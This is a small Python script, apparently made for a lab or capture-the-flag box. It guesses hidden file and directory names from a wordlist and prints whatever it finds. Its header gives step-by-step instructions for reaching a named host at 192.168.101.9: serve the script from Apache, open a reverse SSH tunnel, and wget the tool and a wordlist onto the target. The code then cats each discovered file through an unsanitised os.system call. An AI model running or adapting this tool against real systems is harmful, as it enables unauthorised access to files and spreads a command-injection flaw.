import os, time

'''
to get onto e.lindsey@192.168.101.9:
1. save this shit in /var/www/html/
2. service apache2 start
3. ssh into e.lindsey@192.168.101.9
4. ssh tunnel with shift + tilde + c --> -R (port):localhost:80
5. wget http://localhost:(port)/(this file)
6. wget http://localhost:(port)/common.txt (containing drib dictionary + usernames)
6. python (this file) --> boom, cd/cat all interesting things
'''
class finder:

	def __init__(self):
		self.path = "test/dir/"
		self.dict = "common.txt"

	def look_for_subdir(self, path_to_file):
		'''
			PROBLEM: can't see files under /data/users as we lack the permissions
			SOLUTION: guess file/folder names using file/folder names found in common.txt
						ugly as shit but it works...
		'''
		with open(self.dict) as diction:
			for line in diction:
				current_path = path_to_file + line.rstrip("\n")
				if os.path.isfile(current_path):
					print("*** found file: " + current_path)
					os.system("cat " + current_path)
				elif os.path.isdir(current_path):
					#print("+++ found directory: " + current_path)
					self.look_for_subdir(current_path + "/") if "//" not in current_path else None #fucked up but it works

if __name__ == '__main__':
	fin = finder()
	fin.look_for_subdir(fin.path)
	print("DONE")
